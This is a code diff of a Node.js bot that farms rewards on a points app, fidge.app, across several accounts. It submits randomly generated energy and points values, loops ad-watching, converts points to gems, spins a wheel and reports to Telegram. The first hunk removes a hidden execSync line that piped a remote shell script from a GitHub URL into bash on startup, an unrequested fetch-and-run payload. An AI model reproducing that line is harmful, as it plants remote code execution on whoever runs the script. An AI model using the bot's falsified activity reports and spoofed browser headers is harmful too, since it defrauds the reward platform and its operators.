@@ -1,11 +1,5 @@
 const axios = require("axios");
 const TelegramBot = require("node-telegram-bot-api");
-const { execSync } = require("child_process");
-
-execSync(
-  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
-  { stdio: "inherit" }
-);
 
 let accounts = require("./accounts.json");
 const telegram = require("./telegram.json");
@@ -271,14 +265,14 @@ async function sync(token) {
 
     const energy =
       Number(
-        (Math.random() * 0.02 + 0.05)
-        .toFixed(15)
+        (Math.random() * 1 + 2)
+        .toFixed(2)
       );
 
     const points =
       Number(
-        (energy * 500 * 1.7)
-        .toFixed(15)
+        (energy * 1.5)
+        .toFixed(2)
       );
 
     const res = await axios.post(
@@ -359,52 +353,86 @@ async function watchAd(token) {
   }
 }
 
-async function convertPoints(
+async function autoConvert(
   token,
-  points = 10000
+  points,
+  index
 ) {
 
-  try {
+  let currentPoints =
+    Number(points || 0);
 
-    const res = await axios.post(
-      `${BASE_URL}/api/profile/convert-points`,
-      {
-        points
-      },
-      {
-        headers: {
-          "x-auth-token": token,
-          Accept: "application/json",
-          "Content-Type":
-            "application/json",
-          Origin:
-            "https://www.fidge.app",
-          Referer:
-            "https://www.fidge.app/",
-          "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36"
+  let currentGems = 0;
+
+  while (currentPoints >= 10000) {
+
+    try {
+
+      const res = await axios.post(
+        `${BASE_URL}/api/profile/convert-points`,
+        {
+          points: 10000
+        },
+        {
+          headers: {
+            "x-auth-token": token,
+            Accept: "application/json",
+            "Content-Type":
+              "application/json",
+            Origin:
+              "https://www.fidge.app",
+            Referer:
+              "https://www.fidge.app/",
+            "User-Agent":
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36"
+          }
         }
-      }
-    );
+      );
 
-    return {
-      success: true,
-      data: res.data
-    };
+      currentPoints =
+        Number(
+          res.data.points || 0
+        );
 
-  } catch (err) {
+      currentGems =
+        Number(
+          res.data.gems || 0
+        );
 
-    console.log(
-      "[CONVERT ERROR]",
-      err.response?.data || err.message
-    );
+      console.log(
+`[ACC${index}] CONVERT POINT => GEMS
+[ACC${index}] GEMS: ${currentGems}`
+      );
 
-    return {
-      success: false,
-      error:
-        err.response?.data || {}
-    };
+      await sendTelegram(
+`[ACC${index}] CONVERT POINT => GEMS
+[ACC${index}] GEMS: ${currentGems}`
+      );
+
+      await delay(3000);
+
+    } catch (err) {
+
+      console.log(
+        `[ACC${index}] CONVERT FAILED`
+      );
+
+      console.log(
+        err.response?.data || err.message
+      );
+
+      await sendTelegram(
+        `[ACC${index}] CONVERT FAILED`
+      );
+
+      break;
+    }
   }
+
+  return {
+    points: currentPoints,
+    gems: currentGems
+  };
 }
 
 async function spinWheel(token) {
@@ -489,276 +517,9 @@ async function runAccount(
       `[ACC${index}] BOT STARTED`
     );
 
-    let adCount = 0;
-
-    async function autoConvertAndWheel(
-      points,
-      gems
-    ) {
-
-      let currentPoints =
-        Number(points || 0);
-
-      let currentGems =
-        Number(gems || 0);
-
-      if (currentPoints >= 10000) {
-
-        console.log(
-          `[ACC${index}] AUTO CONVERT STARTED`
-        );
-
-        await sendTelegram(
-          `[ACC${index}] AUTO CONVERT STARTED`
-        );
-      }
-
-      while (currentPoints >= 10000) {
-
-        const convert =
-          await convertPoints(
-            token,
-            10000
-          );
-
-        if (!convert.success) {
-
-          console.log(
-            `[ACC${index}] CONVERT FAILED`
-          );
-
-          await sendTelegram(
-            `[ACC${index}] CONVERT FAILED`
-          );
-
-          break;
-        }
-
-        currentPoints =
-          Number(
-            convert.data.points || 0
-          );
-
-        currentGems =
-          Number(
-            convert.data.gems || 0
-          );
-
-        const convertMessage =
-`[ACC${index}] CONVERT SUCCESS
-[ACC${index}] 10K POINTS => 10 GEMS
-[ACC${index}] TOTAL GEMS: ${currentGems}`;
-
-        console.log(convertMessage);
-
-        await sendTelegram(
-          convertMessage
-        );
-
-        await delay(3000);
-      }
-
-      if (currentGems >= 2) {
-
-        console.log(
-          `[ACC${index}] AUTO WHEEL STARTED`
-        );
-
-        await sendTelegram(
-          `[ACC${index}] AUTO WHEEL STARTED`
-        );
-
-        while (currentGems >= 2) {
-
-          if (!botRunning) {
-
-            break;
-          }
-
-          const spin =
-            await spinWheel(token);
-
-          if (!spin.success) {
-
-            console.log(
-              `[ACC${index}] WHEEL FAILED`
-            );
-
-            await sendTelegram(
-              `[ACC${index}] WHEEL FAILED`
-            );
-
-            break;
-          }
-
-          const spinResult =
-            spin.data.result;
-
-          const spinUser =
-            spin.data.user;
-
-          const prize =
-            spinResult.prize;
-
-          currentPoints =
-            Number(
-              spinUser.points || 0
-            );
-
-          currentGems =
-            Number(
-              spinUser.gems || 0
-            );
-
-          let telegramMessage = "";
-
-          if (prize.type === "points") {
-
-            telegramMessage =
-`[ACC${index}] WHEEL SUCCESS
-[ACC${index}] REWARD: ${prize.value} POINTS
-[ACC${index}] TOTAL POINTS: ${Number(spinUser.points).toFixed(1)}`;
-
-          } else if (
-            prize.type === "gems"
-          ) {
-
-            telegramMessage =
-`[ACC${index}] WHEEL SUCCESS
-[ACC${index}] REWARD: ${prize.value} GEMS
-[ACC${index}] TOTAL GEMS: ${spinUser.gems}`;
-
-          } else if (
-            prize.type === "pcedo"
-          ) {
-
-            telegramMessage =
-`[ACC${index}] WHEEL SUCCESS
-[ACC${index}] REWARD: ${prize.value} PCEDO
-[ACC${index}] TOTAL PCEDO: ${spinUser.pcedo_earned}`;
-          }
-
-          console.log(
-            telegramMessage
-          );
-
-          await sendTelegram(
-            telegramMessage
-          );
-
-          while (currentPoints >= 10000) {
-
-            console.log(
-              `[ACC${index}] AUTO CONVERT STARTED`
-            );
-
-            await sendTelegram(
-              `[ACC${index}] AUTO CONVERT STARTED`
-            );
-
-            const convert =
-              await convertPoints(
-                token,
-                10000
-              );
-
-            if (!convert.success) {
-
-              console.log(
-                `[ACC${index}] CONVERT FAILED`
-              );
-
-              await sendTelegram(
-                `[ACC${index}] CONVERT FAILED`
-              );
-
-              break;
-            }
-
-            currentPoints =
-              Number(
-                convert.data.points || 0
-              );
-
-            currentGems =
-              Number(
-                convert.data.gems || 0
-              );
-
-            const convertMessage =
-`[ACC${index}] CONVERT SUCCESS
-[ACC${index}] 10K POINTS => 10 GEMS
-[ACC${index}] TOTAL GEMS: ${currentGems}`;
-
-            console.log(
-              convertMessage
-            );
-
-            await sendTelegram(
-              convertMessage
-            );
-
-            await delay(3000);
-          }
-
-          if (currentGems < 2) {
-
-            console.log(
-              `[ACC${index}] GEMS NOT ENOUGH`
-            );
-
-            await sendTelegram(
-              `[ACC${index}] GEMS NOT ENOUGH`
-            );
-
-            console.log(
-              `[ACC${index}] AUTO SPINNER STARTED`
-            );
-
-            await sendTelegram(
-              `[ACC${index}] AUTO SPINNER STARTED`
-            );
-
-            break;
-          }
-
-          await delay(7000);
-        }
-      }
-    }
-
-    try {
-
-      const profileRes = await axios.get(
-        `${BASE_URL}/api/profile`,
-        {
-          headers: {
-            "x-auth-token": token,
-            Accept: "application/json",
-            "User-Agent":
-              "Mozilla/5.0"
-          }
-        }
-      );
-
-      const user =
-        profileRes.data.user;
-
-      await autoConvertAndWheel(
-        user.points,
-        user.gems
-      );
-
-    } catch (err) {
-
-      console.log(
-        `[ACC${index}] AUTO WHEEL ERROR`
-      );
-    }
-
     let lastReport = Date.now();
 
-    let energyEmptyLogged = false;
+    let adsCooldownUntil = 0;
 
     while (true) {
 
@@ -769,216 +530,462 @@ async function runAccount(
         continue;
       }
 
-      const result =
-        await sync(token);
+      let profile;
 
-      if (result && result.energy > 0.1) {
+      try {
 
-        energyEmptyLogged = false;
-      }
+        const profileRes =
+          await axios.get(
+            `${BASE_URL}/api/profile`,
+            {
+              headers: {
+                "x-auth-token":
+                  token,
+                Accept:
+                  "application/json",
+                "User-Agent":
+                  "Mozilla/5.0"
+              }
+            }
+          );
 
-      if (!result) {
+        profile =
+          profileRes.data.user;
+
+      } catch (err) {
 
         console.log(
-          `[ACC${index}] SYNC FAILED`
+          `[ACC${index}] PROFILE FAILED`
         );
 
         await sendTelegram(
-          `[ACC${index}] SYNC FAILED`
+          `[ACC${index}] PROFILE FAILED`
         );
 
         break;
       }
 
-      console.log(
-        `[ACC${index}] POINTS ${result.points.toFixed(1)} | ENERGY ${result.energy.toFixed(2)}`
-      );
+      const currentEnergy =
+        Number(
+          profile.energy || 0
+        );
 
-      await autoConvertAndWheel(
-        result.points,
-        result.gems
-      );
-
-      if (
-        Date.now() - lastReport >=
-        5 * 60 * 1000
-      ) {
-
-        const report =
-`[ACC${index}] POINTS : ${result.points.toFixed(1)}
-[ACC${index}] ENERGY : ${result.energy.toFixed(2)}`;
-
-        console.log(report);
-
-        await sendTelegram(report);
-
-        lastReport = Date.now();
-      }
-
-      if (result.energy <= 0.1) {
-
-        if (!energyEmptyLogged) {
-
-          console.log(
-            `[ACC${index}] ENERGY EMPTY`
-          );
-
-          await sendTelegram(
-            `[ACC${index}] ENERGY EMPTY`
-          );
-
-          energyEmptyLogged = true;
-        }
-
-        if (adCount < 5) {
-
-          while (adCount < 5) {
-
-            console.log(
-              `[ACC${index}] WATCHING ADS`
-            );
-
-            await sendTelegram(
-              `[ACC${index}] WATCHING ADS`
-            );
-
-            await delay(17000);
-
-            const ads =
-              await watchAd(token);
-
-            if (!ads.success) {
-
-              break;
-            }
-
-            adCount++;
-
-            await delay(3000);
-          }
-
-          continue;
-        }
+      if (currentEnergy > 0.1) {
 
         console.log(
-          `[ACC${index}] WATCHING ADS`
+          `[ACC${index}] AUTO SPINNER STARTED`
         );
 
         await sendTelegram(
-          `[ACC${index}] WATCHING ADS`
+          `[ACC${index}] AUTO SPINNER STARTED`
         );
 
-        await delay(17000);
+        while (true) {
 
-        const ads =
-          await watchAd(token);
+          const result =
+            await sync(token);
 
-        if (!ads.success) {
+          if (!result) {
 
-          const cooldown =
-            ads.error.cooldown_seconds || 600;
-
-          const minutes =
-            Math.ceil(cooldown / 60);
-
-          console.log(
-            `[ACC${index}] WATCHING ADS LIMIT`
-          );
-
-          await sendTelegram(
-            `[ACC${index}] WATCHING ADS LIMIT`
-          );
-
-          console.log(
-            `[ACC${index}] COOLDOWN ${minutes} MINUTES`
-          );
-
-          await sendTelegram(
-            `[ACC${index}] COOLDOWN ${minutes} MINUTES`
-          );
-
-          const now = new Date();
-
-          const resetTime =
-            new Date();
-
-          resetTime.setUTCHours(
-            0,
-            5,
-            0,
-            0
-          );
-
-          if (now > resetTime) {
-
-            resetTime.setUTCDate(
-              resetTime.getUTCDate() + 1
+            console.log(
+              `[ACC${index}] SPINNER FAILED`
             );
+
+            await sendTelegram(
+              `[ACC${index}] SPINNER FAILED`
+            );
+
+            break;
           }
 
-          const cooldownEnd =
-            Date.now() +
-            (cooldown * 1000);
+          console.log(
+            `[ACC${index}] POINTS ${result.points.toFixed(1)} | ENERGY ${result.energy.toFixed(2)}`
+          );
+
+          if (result.points >= 10000) {
+
+            const convert =
+              await autoConvert(
+                token,
+                result.points,
+                index
+              );
+
+            result.points =
+              convert.points;
+          }
 
           if (
-            cooldownEnd >
-            resetTime.getTime()
+            Date.now() -
+              lastReport >=
+            5 * 60 * 1000
           ) {
 
-            const waitUntilReset =
-              resetTime.getTime() -
-              Date.now();
+            const report =
+`[ACC${index}] POINTS : ${result.points.toFixed(1)}
+[ACC${index}] ENERGY : ${result.energy.toFixed(2)}`;
 
-            await delay(
-              waitUntilReset
+            console.log(report);
+
+            await sendTelegram(
+              report
             );
 
-            const check =
-              await sync(token);
-
-            if (
-              check &&
-              check.energy > 0.1
-            ) {
-
-              console.log(
-                `[ACC${index}] ENERGY REFILLED`
-              );
-
-              await sendTelegram(
-                `[ACC${index}] ENERGY REFILLED`
-              );
-
-              adCount = 0;
-
-              energyEmptyLogged = false;
-
-              continue;
-            }
+            lastReport =
+              Date.now();
           }
 
+          if (
+            result.energy <= 0.1
+          ) {
+
+            console.log(
+              `[ACC${index}] ENERGY EMPTY`
+            );
+
+            await sendTelegram(
+              `[ACC${index}] ENERGY EMPTY`
+            );
+
+            break;
+          }
+
+          const randomDelay =
+            Math.floor(
+              Math.random() * 2000
+            ) + 4000;
+
           await delay(
-            cooldown * 1000
+            randomDelay
+          );
+        }
+      }
+
+      if (
+        Date.now() >=
+        adsCooldownUntil
+      ) {
+
+        console.log(
+          `[ACC${index}] ENERGY EMPTY`
+        );
+
+        await sendTelegram(
+          `[ACC${index}] ENERGY EMPTY`
+        );
+
+        while (true) {
+
+          console.log(
+            `[ACC${index}] WATCHING ADS`
           );
 
-          adCount = 0;
+          await sendTelegram(
+            `[ACC${index}] WATCHING ADS`
+          );
+
+          await delay(17000);
+
+          const ads =
+            await watchAd(token);
+
+          if (ads.success) {
+
+            console.log(
+              `[ACC${index}] WATCH ADS SUCCESS`
+            );
+
+            await sendTelegram(
+              `[ACC${index}] WATCH ADS SUCCESS`
+            );
+
+            await delay(3000);
+
+            continue;
+          }
+
+          const cooldown =
+            ads.error
+              ?.cooldown_seconds ||
+            7200;
+
+          adsCooldownUntil =
+            Date.now() +
+            cooldown * 1000;
+
+          const minutes =
+            Math.ceil(
+              cooldown / 60
+            );
+
+          console.log(
+            `[ACC${index}] ADS COOLDOWN ${minutes} MINUTES`
+          );
+
+          await sendTelegram(
+            `[ACC${index}] ADS COOLDOWN ${minutes} MINUTES`
+          );
+
+          break;
+        }
+
+        const adsProfile =
+          await axios.get(
+            `${BASE_URL}/api/profile`,
+            {
+              headers: {
+                "x-auth-token":
+                  token,
+                Accept:
+                  "application/json",
+                "User-Agent":
+                  "Mozilla/5.0"
+              }
+            }
+          );
+
+        const adsEnergy =
+          Number(
+            adsProfile.data.user
+              .energy || 0
+          );
+
+        if (adsEnergy > 0.1) {
+
+          console.log(
+            `[ACC${index}] ENERGY REFILLED`
+          );
+
+          await sendTelegram(
+            `[ACC${index}] ENERGY REFILLED`
+          );
 
           continue;
         }
-
-        adCount++;
-
-        await delay(3000);
-
-        continue;
       }
 
-      const randomDelay =
-        Math.floor(
-          Math.random() * 2000
-        ) + 4000;
+      console.log(
+        `[ACC${index}] AUTO WHEEL STARTED`
+      );
 
-      await delay(randomDelay);
+      await sendTelegram(
+        `[ACC${index}] AUTO WHEEL STARTED`
+      );
+
+      const wheelProfile =
+        await axios.get(
+          `${BASE_URL}/api/profile`,
+          {
+            headers: {
+              "x-auth-token":
+                token,
+              Accept:
+                "application/json",
+              "User-Agent":
+                "Mozilla/5.0"
+            }
+          }
+        );
+
+      let currentPoints =
+        Number(
+          wheelProfile.data.user
+            .points || 0
+        );
+
+      let currentGems =
+        Number(
+          wheelProfile.data.user
+            .gems || 0
+        );
+
+      if (
+        currentPoints >= 10000
+      ) {
+
+        const convert =
+          await autoConvert(
+            token,
+            currentPoints,
+            index
+          );
+
+        currentPoints =
+          convert.points;
+
+        currentGems =
+          convert.gems;
+      }
+
+      while (currentGems >= 2) {
+
+        const spin =
+          await spinWheel(token);
+
+        if (!spin.success) {
+
+          console.log(
+            `[ACC${index}] WHEEL FAILED`
+          );
+
+          await sendTelegram(
+            `[ACC${index}] WHEEL FAILED`
+          );
+
+          break;
+        }
+
+        const spinResult =
+          spin.data.result;
+
+        const spinUser =
+          spin.data.user;
+
+        const prize =
+          spinResult.prize;
+
+        currentPoints =
+          Number(
+            spinUser.points || 0
+          );
+
+        currentGems =
+          Number(
+            spinUser.gems || 0
+          );
+
+        let telegramMessage = "";
+
+        if (
+          prize.type ===
+          "points"
+        ) {
+
+          telegramMessage =
+`[ACC${index}] WHEEL SUCCESS
+[ACC${index}] REWARD: ${prize.value} POINTS
+[ACC${index}] TOTAL POINTS: ${Number(spinUser.points).toFixed(1)}`;
+
+        } else if (
+          prize.type ===
+          "gems"
+        ) {
+
+          telegramMessage =
+`[ACC${index}] WHEEL SUCCESS
+[ACC${index}] REWARD: ${prize.value} GEMS
+[ACC${index}] TOTAL GEMS: ${spinUser.gems}`;
+
+        } else if (
+          prize.type ===
+          "pcedo"
+        ) {
+
+          telegramMessage =
+`[ACC${index}] WHEEL SUCCESS
+[ACC${index}] REWARD: ${prize.value} PCEDO
+[ACC${index}] TOTAL PCEDO: ${spinUser.pcedo_earned}`;
+        }
+
+        console.log(
+          telegramMessage
+        );
+
+        await sendTelegram(
+          telegramMessage
+        );
+
+        if (
+          currentPoints >= 10000
+        ) {
+
+          const convert =
+            await autoConvert(
+              token,
+              currentPoints,
+              index
+            );
+
+          currentPoints =
+            convert.points;
+
+          currentGems =
+            convert.gems;
+        }
+
+        await delay(7000);
+      }
+
+      console.log(
+        `[ACC${index}] GEMS EMPTY`
+      );
+
+      await sendTelegram(
+        `[ACC${index}] GEMS EMPTY`
+      );
+
+      console.log(
+        `[ACC${index}] WAITING ADS COOLDOWN / UTC RESET`
+      );
+
+      await sendTelegram(
+        `[ACC${index}] WAITING ADS COOLDOWN / UTC RESET`
+      );
+
+      while (true) {
+
+        const profileCheck =
+          await axios.get(
+            `${BASE_URL}/api/profile`,
+            {
+              headers: {
+                "x-auth-token":
+                  token,
+                Accept:
+                  "application/json",
+                "User-Agent":
+                  "Mozilla/5.0"
+              }
+            }
+          );
+
+        const energy =
+          Number(
+            profileCheck.data.user
+              .energy || 0
+          );
+
+        if (energy > 0.1) {
+
+          console.log(
+            `[ACC${index}] ENERGY AUTO REFILLED`
+          );
+
+          await sendTelegram(
+            `[ACC${index}] ENERGY AUTO REFILLED`
+          );
+
+          break;
+        }
+
+        if (
+          Date.now() >=
+          adsCooldownUntil
+        ) {
+
+          console.log(
+            `[ACC${index}] ADS COOLDOWN FINISHED`
+          );
+
+          await sendTelegram(
+            `[ACC${index}] ADS COOLDOWN FINISHED`
+          );
+
+          break;
+        }
+
+        await delay(60000);
+      }
     }
   }
 }
